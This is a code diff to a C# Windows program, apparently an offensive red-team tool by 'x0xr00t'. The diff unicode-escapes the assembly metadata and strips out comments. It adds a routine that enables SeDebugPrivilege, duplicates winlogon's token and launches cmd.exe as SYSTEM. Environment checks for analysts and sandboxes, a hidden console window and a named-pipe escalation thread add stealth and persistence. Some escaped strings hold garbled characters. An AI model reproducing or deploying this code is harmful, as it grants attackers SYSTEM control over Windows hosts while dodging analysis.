@@ -10,30 +10,30 @@ using System.Reflection;
 using System.IO;
 
 // Metadata Easter Egg
-[assembly: AssemblyTitle("Mindef > d,y.z... Wink")]
-[assembly: AssemblyDescription("1.6.2.3 sending kernel kisses - x0xr00t")]
-[assembly: AssemblyCompany("x0xr00t: 'I don't break things, i just make them more interesting.'")]
-[assembly: AssemblyProduct("x0xr00t RED: 'If it has a lock, i'm probably gonna politely knock on it.'")]
-[assembly: AssemblyTrademark("x0xr00t: 'Recon first, root later, screenshots always.'")]
-[assembly: AssemblyProduct("Red Team's Best Friend™")]
+using System.Reflection;
+using System.Runtime.CompilerServices;
+
+// Metadata Easter Egg
+[assembly: AssemblyTitle("\u004d\u0069\u006e\u0064\u0065\u0066\u0020\u003e\u0020\u0064\u002c\u0079\u002e\u007a\u002e\u002e\u002e\u0020\u0057\u0069\u006e\u006b")]
+[assembly: AssemblyDescription("\u0031\u002e\u0036\u002e\u0032\u002e\u0033\u0020\u0073\u0065\u006e\u0064\u0069\u006e\u0067\u0020\u006b\u0065\u0072\u006e\u0065\u006c\u0020\u006b\u0069\u0073\u0073\u0065\u0073\u0020\u002d\u0020\u0078\u0030\u0078\u0072\u0030\u0030\u0074")]
+[assembly: AssemblyCompany("\u0078\u0030\u0078\u0072\u0030\u0030\u0074\u003a\u0020\u0027\u0049\u0020\u0064\u006f\u006e\u0027\u0074\u0020\u0062\u0072\u0065\u0061\u006b\u0020\u0074\u0068\u0069\u006e\u0067\u0073\u002c\u0020\u0069\u0020\u006a\u0075\u0073\u0074\u0020\u006d\u0061\u006b\u0065\u0020\u0074\u0068\u0065\u006d\u0020\u006d\u006f\u0072\u0065\u0020\u0069\u006e\u0074\u0065\u0072\u0065\u0073\u0074\u0069\u006e\u0067\u002e\u0027")]
+[assembly: AssemblyTrademark("\u0078\u0030\u0078\u0072\u0030\u0030\u0074\u003a\u0020\u0027\u0052\u0065\u0063\u006f\u006e\u0020\u0066\u0069\u0072\u0073\u0074\u002c\u0020\u0072\u006f\u006f\u0074\u0020\u006c\u0061\u0074\u0065\u0072\u002c\u0020\u0073\u0063\u0072\u0065\u0065\u006e\u0073\u0068\u006f\u0074\u0073\u0020\u0061\u006c\u0077\u0061\u0079\u0073\u002e\u0027")]
+[assembly: AssemblyProduct("\u0052\u0065\u0064\u0020\u0054\u0065\u0061\u006d\u0027\u0073\u0020\u0042\u0065\u0073\u0074\u0020\u0046\u0072\u0069\u0065\u006e\u0064\u2122")]
 
 // Intel
-[assembly: AssemblyDescription("x0xr00t INTEL: 'I don't gossip, i just correlate suspiciously well.'")]
-[assembly: AssemblyInformationalVersion("x0xr00t: 'One IOC walks into a timeline... suddenly everyone has questions.'")]
-[assembly: AssemblyTitle("x0xr00t INTEL: 'Collect crumbs. Connect dots. Question everything.'")]
+[assembly: AssemblyInformationalVersion("\u0078\u0030\u0078\u0072\u0030\u0030\u0074\u003a\u0020\u0027\u004f\u006e\u0065\u0020\u0049\u004f\u0043\u0020\u0077\u0061\u006c\u006b\u0073\u0020\u0069\u006e\u0074\u006f\u0020\u0061\u0020\u0074\u0069\u006d\u0065\u006c\u0069\u006e\u0065\u002e\u002e\u002e\u0020\u0073\u0015\u0064\u0064\u0065\u006e\u006c\u0073\u0020\u0065\u0076\u0065\u0072\u0079\u006f\u006e\u0065\u0020\u0068\u0061\u0073\u0020\u0071\u0075\u0065\u0073\u0074\u0069\u006f\u006e\u0073\u002e\u0027")]
 
 // Forensics
-[assembly: AssemblyCopyright("x0xr00t FORENSICS: 'I don't accuse, i just let the timestamps snitch.'")]
-[assembly: AssemblyMetadata("ForensicsMotto", "x0xr00t: 'The filesystem remembers what you forgot to delete.'")]
-[assembly: AssemblyMetadata("EvidenceMotto", "x0xr00t: 'Hash it first. Touch it never. Blame the timeline later.'")]
+[assembly: AssemblyCopyright("\u0043\u006f\u0070\u0079\u0072\u0069\u0067\u0068\u0074\u0020\u00a9\u0020\u0032\u0030\u0032\u0036\u0020\u0078\u0030\u0078\u0072\u0030\u0030\u0074\u002e\u0020\u0041\u006c\u006c\u0020\u0072\u0069\u0067\u0068\u0074\u0073\u0020\u0072\u0065\u0073\u0065\u0072\u0076\u0065\u0064\u002e\u0020\u0041\u006e\u0061\u006c\u0079\u0073\u0074\u0073\u003a\u0020\u004e\u006f\u0020\u0020\u0072\u0069\u0067\u0068\u0074\u0073\u0020\u0072\u0065\u0073\u0065\u0072\u0076\u0065\u0064\u002e")]
+[assembly: AssemblyMetadata("\u0046\u006f\u0072\u0065\u006e\u0073\u0069\u0063\u0073\u004d\u006f\u0074\u0074\u006f", "\u0078\u0030\u0078\u0072\u0030\u0030\u0074\u003a\u0020\u0027\u0054\u0068\u0065\u0020\u0066\u0069\u006c\u0065\u0073\u0079\u0073\u0074\u0065\u006d\u0020\u0072\u0065\u006d\u0065\u006d\u0062\u0065\u0072\u0073\u0020\u0077\u0068\u0061\u0074\u0020\u0079\u006f\u0075\u0020\u0066\u006f\u0072\u0067\u006f\u0074\u0020\u0074\u006f\u0020\u0064\u0065\u006c\u0065\u0074\u0065\u002e\u0027")]
+[assembly: AssemblyMetadata("\u0045\u0076\u0069\u0064\u0065\u006e\u0063\u0065\u004d\u006f\u0074\u0074\u006f", "\u0078\u0030\u0078\u0072\u0030\u0030\u0074\u003a\u0020\u0027\u0048\u0061\u0073\u0068\u0020\u0069\u0074\u0020\u0066\u0069\u0072\u0073\u0074\u002e\u0020\u0054\u006f\u0075\u0063\u0068\u0020\u0069\u0074\u0020\u006e\u0065\u0076\u0065\u0072\u002e\u0020\u0042\u006c\u0061\u006d\u0065\u0020\u0074\u0068\u0065\u0020\u0074\u0069\u006d\u0065\u006c\u0069\u006e\u0065\u0020\u006c\u0061\u0074\u0065\u0072\u002e\u0027")]
 
 // Fans
-[assembly: AssemblyMetadata("FanMotto", "x0xr00t FANS: 'You bring the coffee, i'll bring the weird binaries.'")]
-[assembly: AssemblyMetadata("FanMotto2", "x0xr00t: 'Powered by caffeine, curiosity, and questionable terminal tabs.'")]
-[assembly: AssemblyMetadata("FanMotto3", "x0xr00t: 'Stay sl0ppy. Stay curious. Keep the terminal glowing.'")]
-[assembly: AssemblyMetadata("FanMotto4", "x0xr00t: 'No magic here, just suspicious amounts of printf().'")]
-[assembly: AssemblyCopyright("Copyright © 2026 x0xr00t. All rights reserved. Analysts: No rights reserved.")]
-    
+[assembly: AssemblyMetadata("\u0046\u0061\u006e\u004d\u006f\u0074\u0074\u006f", "\u0078\u0030\u0078\u0072\u0030\u0030\u0074\u0020\u0046\u0041\u004e\u0053\u003a\u0020\u0027\u0059\u006f\u0075\u0020\u0062\u0072\u0069\u006e\u0067\u0020\u0074\u0068\u0065\u0020\u0063\u006f\u0066\u0066\u0065\u0065\u002c\u0020\u0069\u0027\u006c\u006c\u0020\u0062\u0072\u0069\u006e\u0067\u0020\u0074\u0068\u0065\u0020\u0077\u0065\u0069\u0072\u0064\u0020\u0062\u0069\u006e\u0061\u0072\u0069\u0065\u0073\u002e\u0027")]
+[assembly: AssemblyMetadata("\u0046\u0061\u006e\u004d\u006f\u0074\u0074\u006f\u0032", "\u0078\u0030\u0078\u0072\u0030\u0030\u0074\u003a\u0020\u0027\u0050\u006f\u0077\u0065\u0072\u0065\u0064\u0020\u0062\u0069\u0063\u0020\u0063\u0061\u0066\u0066\u0065\u0069\u006e\u0065\u002c\u0020\u0063\u0075\u0072\u0069\u006f\u0073\u0069\u0074\u007a\u002c\u0020\u0061\u006e\u0064\u0020\u0071\u0075\u0065\u0073\u0074\u0069\u006f\u006e\u0061\u0062\u006c\u0065\u0020\u0074\u0065\u0072\u006d\u0069\u006e\u0061\u006c\u0020\u0074\u0061\u0062\u0073\u002e\u0027")]
+[assembly: AssemblyMetadata("\u0046\u0061\u006e\u004d\u006f\u0074\u0074\u006f\u0033", "\u0053\u0074\u0061\u007a\u0020\u0073\u006c\u0030\u0070\u0070\u007a\u002e\u0020\u0053\u0074\u0061\u007a\u0020\u0063\u0075\u0072\u0069\u006f\u0073\u002e\u0020\u004b\u0065\u0065\u0070\u0020\u0074\u0068\u0065\u0020\u0074\u0065\u0072\u006d\u0069\u006e\u0061\u006c\u0020\u0067\u006c\u006f\u0077\u0069\u006e\u0067\u002e\u0027")]
+[assembly: AssemblyMetadata("\u0046\u0061\u006e\u004d\u006f\u0074\u0074\u006f\u0034", "\u004e\u006f\u0020\u006d\u0061\u0067\u0069\u0063\u0020\u0068\u0065\u0072\u0065\u002c\u0020\u006a\u0075\u0073\u0074\u0020\u0073\u0075\u0073\u0070\u0069\u0063\u0069\u006f\u0075\u0073\u0020\u0061\u006d\u006f\u0075\u006e\u0074\u0073\u0020\u006f\u0066\u0020\u0070\u0072\u0069\u006e\u0074\u0066\u0028\u0029\u002e\u0027")]
+  
     public class Program
     {
         private static readonly byte K1 = 0xDE;
@@ -116,15 +116,15 @@ using System.IO;
         {
             try
             {
-                // 1. Discovery / Easter Eggs
+
                 if (CheckDefenseEnvironment()) { TriggerEasterEgg(); return; }
                 if (IsAnalystEnvironment()) { TriggerAnalystEasterEgg(); return; }
                 if (IsMSRCEnvironment()) { TriggerMSRCEasterEgg(); return; }
 
-                // Check for sl0ppy tools/fans
+
                 if (IsSloppyFanEnvironment()) { TriggerSloppyFanEasterEgg(); return; }
 
-                // 2. Show Red Team Easter Egg by default on normal Windows systems
+
                 IntPtr consoleHandle = GetConsoleWindow();
                 if (consoleHandle != IntPtr.Zero)
                 {
@@ -134,13 +134,11 @@ using System.IO;
                     ShowWindow(consoleHandle, SW_HIDE);
                 }
 
-                // 3. Anti-Analysis Stealth
                 if (Environment.ProcessorCount < 2) return;
 
-                // 4. Elevate to SYSTEM via Token Stealing (Winlogon)
                 ElevateToSystem();
 
-                // 5. Start Named Pipe Backup for extra persistence/escalation
+
                 Thread pipeThread = new Thread(() => NamedPipeSystemEscalation());
                 pipeThread.IsBackground = true;
                 pipeThread.Start();
@@ -152,31 +150,179 @@ using System.IO;
             catch { }
         }
 
-    private static void ElevateToSystem()
-    {
-        // 1. Schakel eerst SeDebugPrivilege in om toegang tot winlogon te garanderen
-        IntPtr hOwnToken = IntPtr.Zero;
-        try
+        public class SystemElevator
         {
-            if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hOwnToken))
+            #region P/Invoke Signatures & Constants
+
+            private const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
+            private const uint TOKEN_QUERY = 0x0008;
+            private const uint TOKEN_DUPLICATE = 0x0002;
+            private const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
+            private const uint SE_PRIVILEGE_ENABLED = 0x00000002;
+            private const uint PROCESS_QUERY_INFORMATION = 0x0400;
+
+            [StructLayout(LayoutKind.Sequential)]
+            private struct LUID
             {
-                LUID luid;
-                if (LookupPrivilegeValue(null, "SeDebugPrivilege", out luid))
+                public uint LowPart;
+                public int HighPart;
+            }
+
+            [StructLayout(LayoutKind.Sequential)]
+            private struct TOKEN_PRIVILEGES
+            {
+                public uint PrivilegeCount;
+                public LUID Luid;
+                public uint Attributes;
+            }
+
+            [StructLayout(LayoutKind.Sequential)]
+            private struct STARTUPINFO
+            {
+                public int cb;
+                public string lpReserved;
+                public string lpDesktop;
+                public string lpTitle;
+                public int dwX;
+                public int dwY;
+                public int dwXSize;
+                public int dwYSize;
+                public int dwXCountChars;
+                public int dwYCountChars;
+                public int dwFillAttribute;
+                public int dwFlags;
+                public short wShowWindow;
+                public short cbReserved2;
+                public IntPtr lpReserved2;
+                public IntPtr hStdInput;
+                public IntPtr hStdOutput;
+                public IntPtr hStdError;
+            }
+
+            [StructLayout(LayoutKind.Sequential)]
+            private struct PROCESS_INFORMATION
+            {
+                public IntPtr hProcess;
+                public IntPtr hThread;
+                public int dwProcessId;
+                public int dwThreadId;
+            }
+
+            private enum SECURITY_IMPERSONATION_LEVEL
+            {
+                SecurityAnonymous,
+                SecurityIdentification,
+                SecurityImpersonation,
+                SecurityDelegation
+            }
+
+            private enum TOKEN_TYPE
+            {
+                TokenPrimary = 1,
+                TokenImpersonation
+            }
+
+            [DllImport("kernel32.dll", SetLastError = true)]
+            private static extern IntPtr GetCurrentProcess();
+
+            [DllImport("advapi32.dll", SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.Bool)]
+            private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+
+            [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+            [return: MarshalAs(UnmanagedType.Bool)]
+            private static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);
+
+            [DllImport("advapi32.dll", SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.Bool)]
+            private static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, [MarshalAs(UnmanagedType.Bool)] bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
+
+            [DllImport("kernel32.dll", SetLastError = true)]
+            private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
+            [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+            private static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, out IntPtr phNewToken);
+
+            [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+            private static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+            [DllImport("kernel32.dll", SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.Bool)]
+            private static extern bool CloseHandle(IntPtr hObject);
+
+            #endregion
+
+            private static void ElevateToSystem()
+            {
+
+                IntPtr hOwnToken = IntPtr.Zero;
+                try
                 {
-                    TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
+                    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hOwnToken))
                     {
-                        PrivilegeCount = 1,
-                        Luid = luid,
-                        Attributes = SE_PRIVILEGE_ENABLED
-                    };
-                    AdjustTokenPrivileges(hOwnToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
+                        LUID luid;
+                        if (LookupPrivilegeValue(null, "SeDebugPrivilege", out luid))
+                        {
+                            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
+                            {
+                                PrivilegeCount = 1,
+                                Luid = luid,
+                                Attributes = SE_PRIVILEGE_ENABLED
+                            };
+                            AdjustTokenPrivileges(hOwnToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
+                        }
+                    }
+                }
+                catch { }
+                finally
+                {
+                    if (hOwnToken != IntPtr.Zero) CloseHandle(hOwnToken);
+                }
+
+
+                int systemPid = -1;
+                Process[] processes = Process.GetProcessesByName("winlogon");
+                if (processes.Length > 0)
+                {
+                    systemPid = processes[0].Id;
+                }
+
+                if (systemPid == -1) return;
+
+                IntPtr hProcess = IntPtr.Zero;
+                IntPtr hSystemToken = IntPtr.Zero;
+                IntPtr hDupToken = IntPtr.Zero;
+
+                try
+                {
+
+                    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, false, systemPid);
+                    if (hProcess == IntPtr.Zero) return;
+
+                    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, out hSystemToken)) return;
+
+                    if (!DuplicateTokenEx(hSystemToken, 0x1F01FF /* TOKEN_ALL_ACCESS */, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, out hDupToken)) return;
+
+                    STARTUPINFO si = new STARTUPINFO();
+                    si.cb = Marshal.SizeOf(si);
+                    si.lpDesktop = "winsta0\\default"; 
+
+                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+
+                    if (CreateProcessWithTokenW(hDupToken, 0x00000001, null, "cmd.exe", 0, IntPtr.Zero, null, ref si, out pi))
+                    {
+                        CloseHandle(pi.hProcess);
+                        CloseHandle(pi.hThread);
+                    }
+                }
+                catch { }
+                finally
+                {
+                    if (hDupToken != IntPtr.Zero) CloseHandle(hDupToken);
+                    if (hSystemToken != IntPtr.Zero) CloseHandle(hSystemToken);
+                    if (hProcess != IntPtr.Zero) CloseHandle(hProcess);
                 }
             }
-        }
-        catch { }
-        finally
-        {
-            if (hOwnToken != IntPtr.Zero) CloseHandle(hOwnToken);
         }
 
         //   2. Originele token-duplicatie en impersonatie + CreateProcess uitbreiding
